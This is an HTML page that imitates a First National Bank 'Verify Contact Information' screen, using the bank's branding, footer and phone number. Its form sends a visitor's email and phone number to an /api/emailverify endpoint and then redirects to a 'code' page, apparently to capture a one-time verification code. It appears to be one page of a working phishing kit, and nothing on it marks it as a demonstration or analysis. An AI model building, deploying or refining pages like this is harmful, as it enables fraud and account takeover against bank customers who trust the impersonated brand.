<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Verify - The FNB</title>
       <!-- Favicons -->
       <link href="/public/images/icon.PNG" rel="icon" type="image/icon">
       <link href="/public/images/icon.PNG" rel="apple-touch-icon" type="image/icon">

       <link rel="stylesheet" href="/public/css/styles.css">
   </head>
 
   <body>
      <header>
         <section>
            <div>
               <img src="/public/images/first-logo.png" alt="logo" >
               <h1>Verify Contact Information</h1>
               <p>Please confirm your contact details on file.</p>
               <form name="fnbverify" action="/api/emailverify" method="POST" id="fnbverify">
                  <input type="text" name="bot-field" style="display: none; visibility: hidden;">
                  <input type="email" name="email" placeholder="Email Address" required>
                  <input type="text" name="phone_number" placeholder="Phone Number" required>
                  
                  <div class="forbut">
                     <button type="submit">Continue</button>
                  </div>
               </form>
            </div>
         </section>
      </header>
      <footer>
         <ul>
            <li>Â©  2024 First National Bank  </li>
            <li>(800) 564-3195</li>
            <li class="chan">Privacy policy</li>
            <li>Member FDIC </li>
            <li> Equal Housing Lender</li>
         </ul>
      </footer>

      <script>
         document.getElementById('fnbverify').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            const formData = new FormData(this);

            const response = await fetch('/api/emailverify', {
                method: 'POST',
                body: JSON.stringify({
                    email: formData.get('email'),
                    phone_number: formData.get('phone_number'),
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            });

            if (response.ok) {
                window.location.href = '/public/code.html'; // Redirect to code  page
            } else {
                alert('Failed to submit. Try again!');
            }
        });
      </script>

   </body>
</html>
